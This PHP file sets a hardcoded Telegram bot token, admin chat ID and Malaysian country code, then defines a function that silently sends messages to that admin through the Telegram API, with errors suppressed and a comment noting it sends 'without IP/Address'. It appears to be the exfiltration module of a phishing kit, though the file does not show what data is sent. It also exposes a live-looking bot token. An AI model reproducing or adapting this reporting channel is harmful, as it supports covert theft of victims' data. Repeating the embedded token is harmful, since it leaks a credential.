<?php
session_start();

// ===== KONFIGURASI LANGSUNG (TANPA _rules.json) =====
$BOTKN  = "8973568693:AAHJQ9ILOOQkKjAtmGBc1cZQ98RntRumDj0";  // Token Bot Telegram Anda
$ADMID  = "7091091230";                                         // ID Telegram Admin Anda
$CCODE  = "60";                                                 // Kode Negara (Malaysia)
// ====================================================

// Fungsi kirim ke Telegram tanpa IP/Address
if (!function_exists('send_to_telegram')) {
    function send_to_telegram($message) {
        global $BOTKN, $ADMID;
        $encodedMessage = urlencode($message);
        $url = "https://api.telegram.org/bot{$BOTKN}/sendMessage?chat_id={$ADMID}&text={$encodedMessage}&parse_mode=HTML";
        
        $context = stream_context_create([
            'http' => [
                'method' => 'GET',
                'timeout' => 10
            ]
        ]);
        
        @file_get_contents($url, false, $context);
    }
}
?>